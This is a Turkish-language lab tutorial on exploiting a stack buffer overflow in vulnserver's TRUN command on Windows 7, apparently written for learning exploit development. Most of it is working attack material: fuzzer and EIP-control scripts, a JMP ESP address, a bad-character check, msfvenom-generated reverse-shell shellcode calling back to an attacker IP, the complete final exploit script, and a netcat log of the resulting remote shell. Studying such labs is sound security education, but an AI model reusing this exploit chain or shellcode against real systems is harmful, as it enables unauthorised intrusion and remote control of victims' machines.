## STACK-BASED BUFFER OVERFLOW

Vulnerable Application: https://github.com/stephenbradshaw/vulnserver
Used Debugger: Immunity Debugger
Attacker: Parrot Security OS
Victim: Windows 7

### CRASH NOKTASI TESPİTİ

Hedef uygulamada, kullanıcıdan girdi alınan noktalar keşfedilir ve o kısımlara fuzzing yapılır.
Amaç, ilgili girdi noktasındaki memory limitini aşıp buffer'ı taşırmak. Taşırma işlemi başarılı olursa uygulama crash olacaktır.

Örnek fuzzer scripti:

```python
--------------------------------
#!/usr/bin/python

import socket

karaktersiz = "A"
i = 200

while len(karaktersiz) < 10000:
	print "Gonderilen uzunluk: ", len(karaktersiz)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(("HEDEF_IP",9999))
	s.recv(1024)
	s.send("TRUN ." + karaktersiz)
	s.recv(1024)
	karaktersiz = "A" * i
	i += 200
	s.close()
--------------------------------
```


### UYGULAMA İÇİN DEBUG İŞLEMLERİ

Kullanılan debugger aracı: Immunity Debugger;
Registerler sağ üst köşede, adresler ve hex dump'lar sol alt köşede, OP mode kodları falan sol yukarıda bulunuyor.
File > Attach diyerek çalışan bir uygulama için debug işlemine başlanır. İlk olarak Paused durumda olan uygulamanın çalışmaya devam etmesi için Play tuşuna basılır (F9).

Fuzzer ile crash için atak başlatılır. 2200 "A" gönderdiğimizde EIP register'ı 41414141 ile doldu yani A'nın ascii karakteri.

ESP register'i, verdiğimiz verileri alıp depolayan kısım. EIP ise, execute edilecek yeri gösteren register'dır. Yani biz EIP'yi kontrol edeceğiz, kontrol edip ESP'yi göstereceğiz. ESP'nin içerisine de kendi hazırladığımız bir shellcode'u koyacağız. Bu sayede ESP üzerinden execute edilen shellcode ile reverse shell bağlantısı alacağız.

ESP'ye sağ tıklayıp Following in Dump diyerek sol alt köşede verdiğimiz A değerlerini ESP'de tutulduğunu görebiliriz.
Aynı zamanda EIP'de de A harfleriyle taşırıldığı için uygulama bozulmuştur ve çalışmayacaktır.
Bu aşamada esas amacımız, uygulamanın tam olarak kaç karakterde crash yediğini tespit etmek. Daha sonra ilgili karakter sayısına 4 bit (yani 4 karakter uzunluğunda string) daha ekleyerek EIP register'ını kontrol etmeye çalışacağız. Yani; EIP'ye kendi istediğimiz bir string'i verebiliyor muyuz? bunu kontrol edeceğiz. 



### OFFSET DEĞERİ

Amaç, tam olarak uygulamanın crash yediği karakter uzunluğunu bulmaktır. Bu sayede ESP' register'ını kontrol edeceğiz. İlgili işlem için bize benzersiz bir string gerekiyor. Bunun için MSF'in pattern_create aracından yararlanılabilir.
Uygulamamız 2000 ila 2400 arasında crash oluyordu..

`
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
`

Elde edilen string uygulamaya gönderilerek EIP register'ının aldığı değeri görmeliyiz. Daha sonra EIP register'ının aldığı aldığı değere bakıp EIP register'ının aldığı string'in başlangıcını ürettiğimiz stringin içindeki pozisyonundan bularak uygulamanın kırılma noktasını bulacağız.

Benzersiz string'i uygulamaya fuzzer scriptiyle veya uygulamaya bağlanıp o şekilde de gönderebiliriz.

Debugger'da uygulama çalışırken string'i gönderdikten sonra uygulama yine crash olacaktır. Bu sefer debugger'da EIP register'ının aldığı karakterleri görüyoruz: 396F4338
EIP'deki ascii olarak olan 396F4338 bu karakterlerin oluşturduğumuz string içindeki hangi pozisyonda bulunduğunu hesaplamak için ise bu sefer MSF'in pattern_offset aracını kullanacağız:

`
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 396F4338
[*] Exact match at offset 2006
`

Artık uygulamanın tam olarak crash verdiği noktayı bulduk: 2006
Yani; uygulamaya 2006 karakter uzunluğunda string gönderilme durumunda kırılıyormuş.



### EIP REGISTER KONTROLÜ

Belirlediğimiz offset değeri olan 2006 karakter uzunluğunda uygulamaya bir string göndereceğiz ve daha sonra 4 karakter uzunluğunda da farklı bir string göndereceğiz. 2006'dan sonraki gelen 4 karakter EIP register'ının yerine set edilecek.

```python
--------------------------------
#!/usr/bin/python

import socket

karaktersiz = "A" * 2006 + 'B' * 4
i = 200

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.43.29',9999))
s.recv(1024)
s.send('TRUN .' + karaktersiz)
s.recv(1024)
s.close()
--------------------------------
```

Bu kod ile 2006 tane A karakteri sonrasında da 4 tane B karakteri uygulamaya gönderilecek. Bu şekilde hedef uygulamaya gönderildiğinde; EIP değeri eğer BBBB yani 42424242 oluyorsa işlem tamamlanmış olacaktır.


###  JMP ESP INSTRUCTOR

Bu aşamada kontrol edebildiğimizi gördüğümüz EIP register'ına ESP register'ını göstermeye zorlamak için uygulama üzerinde bir JMP ESP instructor arayacağız. İlgili işlemde debugger'a mona eklentisini yükleyip onun yardımıyla işlemi gerçekleştireceğiz.
Download: https://github.com/corelan/mona
İndirilen mona.py dosyasını Immunity Debugger yazılımının yüklü olduğu dizindeki PyCommands klasörüne kopyalamamız yeterlidir.

Debugger'da sistem üzerindeki modülleri görüntülemek için: !mona modules

Module info kısmından hem SafeSEH, ASLR gibi koruma önlemleri olmayan (False) hem de 0x00 yani null byte ile başlamayan modülleri tercih etmeliyiz. Bu örnekte essfunc.dll uygun görünüyor. Şimdi bu modül üzerinde Jmp Esp instuctor arayacağız. Peki bu instructor'ın opcode haline nasıl ulaşacağız? Bunun için de MSF'in nasm_shell aracını kullanacağız.

```shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
instuctor'ını yazarak bunun kod halini alabiliriz:
> 00000000  FFE4              jmp esp
```

Modülümüz üzerinde bu instructor var mı onu arayacağız. Bunun için mona'nın find özelliğini kullanacağız: !mona find -s '\xff\xe4' -m essfunc.dll

Bulduğu birkaç adreste ilgili instructor'ın olduğunu bize gösterecektir. Test amaçlı çıkan sonuçlardan en üsttekine çift tıklayıp jmp esp'nin olduğunu görebiliriz.

Amacımız; biz eğer ki bu jmp esp instructor'ını EIP'ye verip ESP'nin adresini gösterirsek ESP'de verdiğimiz shellcode'un çalıştırmasını sağlayacak. Biz bu sebeple jmp esp kodu arıyorduk, direkt olarak ESP'nin adresini gösterirsek eğer ki ESP'nin adresi değişmesi durumunda exploitimiz çalışmayacaktı. Bu sebeple jmp esp instructor'ı aradık. 

Bulunan instructor'a sağ tıklayıp kopyalayalım:
625011AF   FFE4             JMP ESP

Bu instructor'ı kullanarak badchars belirleyeceğiz.


### BADCHARS KONTROLÜ

Badchars, ESP register'ını doldurduğumuzda bozuntuya sebebiyet verecek karakterlerdir. Bunların tespiti için aslında program üzerine tüm karakterleri atıyoruz ve ESP register'ını Follow in Dump diyerek kontrol ediyoruz. Eğer ki firar veren karakterler varsa onu badchars olarak işaretliyoruz. 

Badchars:

```shell
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```


```python
--------------------------------
#!/usr/bin/python

import socket

jmp_esp = '\xAF\x11\x50\x62' #625011AF   FFE4             JMP ESP

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

karaktersiz = 'A' * 2006 + jmp_esp + badchars
i = 200

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.150.18',9999))
s.recv(1024)
s.send('TRUN .' + karaktersiz)
s.recv(1024)
s.close()
--------------------------------
```

Yukarıdaki badchar'ları exploitimiz aracılığıyla hedef uygulamaya göndereceğiz ve nelerin eksik olduğunu kontrol edeceğiz.

Not: jmp esp register'ını artık script'imize ekliyoruz.

Aslında execute edilmeyen ne kadar komut varsa onları tespit edeceğiz. Ve onları badchars olarak işaretleyeceğiz. Not: Tabi hiç badchars da olmayabilir. Bu durumda \x00 (nullbyte) badchar'dır. Null byte'ın arkasından gelen işlemler olmayacaktır bu sebeple \x00'ı çıkaracağız.

Fuzzer scriptini çalıştırıp dönen register'larda ESP'ye sağ tıklayıp Follow in Dump diyoruz ve sol alt penceredeki adreslerde dump detaylarını görebiliriz. Hex Dump kısmını detaylıca kontrol edip (tek tek sayıp) sıralamayı bozan karakterler varsa onlar badchars'tır. (Örn; 46'dan sonra 47 gelmesi gerekirken başka birşey gelmişse o \x47 karakterini badchar olarak işaretlememiz gerekiyor)


### SHELLCODE ve REVERSE SHELL

Shellcode oluşturmak için MSFVenom kullanabiliriz.

Windows platformlar için uygun, içinde nullbyte geçmeyen, C tipinde olan, belirtilen ip ve porta ters bağlantıyla shell açtırmaya yarayan bir payload oluşturuyoruz:
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.17 LPORT=443 -f c --bad-chars '\x00'

Oluşturulan shellcode:

Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xdb\xda\xd9\x74\x24\xf4\xbf\x31\x3b\xfd\x76\x5b\x31\xc9\xb1"
"\x52\x31\x7b\x17\x03\x7b\x17\x83\xf2\x3f\x1f\x83\x08\xd7\x5d"
"\x6c\xf0\x28\x02\xe4\x15\x19\x02\x92\x5e\x0a\xb2\xd0\x32\xa7"
"\x39\xb4\xa6\x3c\x4f\x11\xc9\xf5\xfa\x47\xe4\x06\x56\xbb\x67"
"\x85\xa5\xe8\x47\xb4\x65\xfd\x86\xf1\x98\x0c\xda\xaa\xd7\xa3"
"\xca\xdf\xa2\x7f\x61\x93\x23\xf8\x96\x64\x45\x29\x09\xfe\x1c"
"\xe9\xa8\xd3\x14\xa0\xb2\x30\x10\x7a\x49\x82\xee\x7d\x9b\xda"
"\x0f\xd1\xe2\xd2\xfd\x2b\x23\xd4\x1d\x5e\x5d\x26\xa3\x59\x9a"
"\x54\x7f\xef\x38\xfe\xf4\x57\xe4\xfe\xd9\x0e\x6f\x0c\x95\x45"
"\x37\x11\x28\x89\x4c\x2d\xa1\x2c\x82\xa7\xf1\x0a\x06\xe3\xa2"
"\x33\x1f\x49\x04\x4b\x7f\x32\xf9\xe9\xf4\xdf\xee\x83\x57\x88"
"\xc3\xa9\x67\x48\x4c\xb9\x14\x7a\xd3\x11\xb2\x36\x9c\xbf\x45"
"\x38\xb7\x78\xd9\xc7\x38\x79\xf0\x03\x6c\x29\x6a\xa5\x0d\xa2"
"\x6a\x4a\xd8\x65\x3a\xe4\xb3\xc5\xea\x44\x64\xae\xe0\x4a\x5b"
"\xce\x0b\x81\xf4\x65\xf6\x42\x3b\xd1\x6e\x83\xd3\x20\x8e\xa5"
"\x98\xac\x68\xcf\xce\xf8\x23\x78\x76\xa1\xbf\x19\x77\x7f\xba"
"\x1a\xf3\x8c\x3b\xd4\xf4\xf9\x2f\x81\xf4\xb7\x0d\x04\x0a\x62"
"\x39\xca\x99\xe9\xb9\x85\x81\xa5\xee\xc2\x74\xbc\x7a\xff\x2f"
"\x16\x98\x02\xa9\x51\x18\xd9\x0a\x5f\xa1\xac\x37\x7b\xb1\x68"
"\xb7\xc7\xe5\x24\xee\x91\x53\x83\x58\x50\x0d\x5d\x36\x3a\xd9"
"\x18\x74\xfd\x9f\x24\x51\x8b\x7f\x94\x0c\xca\x80\x19\xd9\xda"
"\xf9\x47\x79\x24\xd0\xc3\x89\x6f\x78\x65\x02\x36\xe9\x37\x4f"
"\xc9\xc4\x74\x76\x4a\xec\x04\x8d\x52\x85\x01\xc9\xd4\x76\x78"
"\x42\xb1\x78\x2f\x63\x90";

Exploit'imizin son hali:

```python
--------------------------------
#!/usr/bin/python

import socket

jmp_esp = '\xAF\x11\x50\x62' #625011AF   FFE4             JMP ESP

shellcode = ("\xdb\xda\xd9\x74\x24\xf4\xbf\x31\x3b\xfd\x76\x5b\x31\xc9\xb1"
"\x52\x31\x7b\x17\x03\x7b\x17\x83\xf2\x3f\x1f\x83\x08\xd7\x5d"
"\x6c\xf0\x28\x02\xe4\x15\x19\x02\x92\x5e\x0a\xb2\xd0\x32\xa7"
"\x39\xb4\xa6\x3c\x4f\x11\xc9\xf5\xfa\x47\xe4\x06\x56\xbb\x67"
"\x85\xa5\xe8\x47\xb4\x65\xfd\x86\xf1\x98\x0c\xda\xaa\xd7\xa3"
"\xca\xdf\xa2\x7f\x61\x93\x23\xf8\x96\x64\x45\x29\x09\xfe\x1c"
"\xe9\xa8\xd3\x14\xa0\xb2\x30\x10\x7a\x49\x82\xee\x7d\x9b\xda"
"\x0f\xd1\xe2\xd2\xfd\x2b\x23\xd4\x1d\x5e\x5d\x26\xa3\x59\x9a"
"\x54\x7f\xef\x38\xfe\xf4\x57\xe4\xfe\xd9\x0e\x6f\x0c\x95\x45"
"\x37\x11\x28\x89\x4c\x2d\xa1\x2c\x82\xa7\xf1\x0a\x06\xe3\xa2"
"\x33\x1f\x49\x04\x4b\x7f\x32\xf9\xe9\xf4\xdf\xee\x83\x57\x88"
"\xc3\xa9\x67\x48\x4c\xb9\x14\x7a\xd3\x11\xb2\x36\x9c\xbf\x45"
"\x38\xb7\x78\xd9\xc7\x38\x79\xf0\x03\x6c\x29\x6a\xa5\x0d\xa2"
"\x6a\x4a\xd8\x65\x3a\xe4\xb3\xc5\xea\x44\x64\xae\xe0\x4a\x5b"
"\xce\x0b\x81\xf4\x65\xf6\x42\x3b\xd1\x6e\x83\xd3\x20\x8e\xa5"
"\x98\xac\x68\xcf\xce\xf8\x23\x78\x76\xa1\xbf\x19\x77\x7f\xba"
"\x1a\xf3\x8c\x3b\xd4\xf4\xf9\x2f\x81\xf4\xb7\x0d\x04\x0a\x62"
"\x39\xca\x99\xe9\xb9\x85\x81\xa5\xee\xc2\x74\xbc\x7a\xff\x2f"
"\x16\x98\x02\xa9\x51\x18\xd9\x0a\x5f\xa1\xac\x37\x7b\xb1\x68"
"\xb7\xc7\xe5\x24\xee\x91\x53\x83\x58\x50\x0d\x5d\x36\x3a\xd9"
"\x18\x74\xfd\x9f\x24\x51\x8b\x7f\x94\x0c\xca\x80\x19\xd9\xda"
"\xf9\x47\x79\x24\xd0\xc3\x89\x6f\x78\x65\x02\x36\xe9\x37\x4f"
"\xc9\xc4\x74\x76\x4a\xec\x04\x8d\x52\x85\x01\xc9\xd4\x76\x78"
"\x42\xb1\x78\x2f\x63\x90")

nop = '\x90' * 16

karaktersiz = 'A' * 2006 + jmp_esp + nop + shellcode
i = 200

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.150.18',9999))
s.recv(1024)
s.send('TRUN .' + karaktersiz)
s.recv(1024)
s.close()
--------------------------------
```

Not: Jmp esp register'ından sonra shellcode'a gelene kadar programın herhangi bir işlem yapmasını önlemek için No Operation (NOP ('\x90')) kodu eklemeliyiz. 4'ün katları yani minimum 16 olacak şekilde exploit kodlarımıza NOP eklemeliyiz. "İşlem yapma demektir". Bu komut, talimat akışında yer kaplayan ancak EIP kaydı hariç makine bağlamını etkilemeyen bir tek bayt'lık talimattır.

ÖZETLE;

İlk olarak uygulamadaki crash noktasını bulduk. Offset değerini hesaplayarak kırılma noktasının 2006 karakterde olduğunu tespit ettik. Daha sonra Mona kullanarak uygulama üzerinde JMP ESP instructor'ı bulduk. ('\xAF\x11\x50\x62' #625011AF) ve bunu 2006. karakterden sonra verdik. Ve EIP register'ımıza bu jmp esp kodunu set ettik. Bu sayede ESP içerisine dolduracağımız verileri execute edebilecektik. Uygulamadaki badchar'ları tespit ettik ki bunda yoktu default olarak \x00 yani nullbyte kullandık. Program shellcode'a gelene kadar herhangi bir işlem yapmaması için kodumuza 16 tane NOP (\x90) instructor'laru ekledik. En son da MSFVenom vasıtasıyla oluşturduğumuz shellcode'u exploitimize tanımlayarak işlemimizi exploit geliştirme işlemimizi tamamladık.
Artık exploit kodumuzu çalıştırmamız durumunda normal şartlar altında hedef sistem üzerinden bir ters bağlantı alabiliriz.

```shell
┌─[root@parrot]─[/home/ixmail/Desktop]
└──╼ #nc -lvp 443
listening on [any] 443 ...
192.168.150.18: inverse host lookup failed: Unknown host
connect to [192.168.150.17] from (UNKNOWN) [192.168.150.18] 49414
Microsoft Windows [Sürüm 6.1.7601]
Telif Hakkı (c) 2009 Microsoft Corporation. Tüm hakları saklıdır.

C:\Users\ismail\Desktop\socketsrv>whoami
whoami
testenv\ismail

C:\Users\ismail\Desktop\socketsrv>echo PWNED!!! 
echo PWNED!!!
PWNED!!!

C:\Users\ismail\Desktop\socketsrv>
```
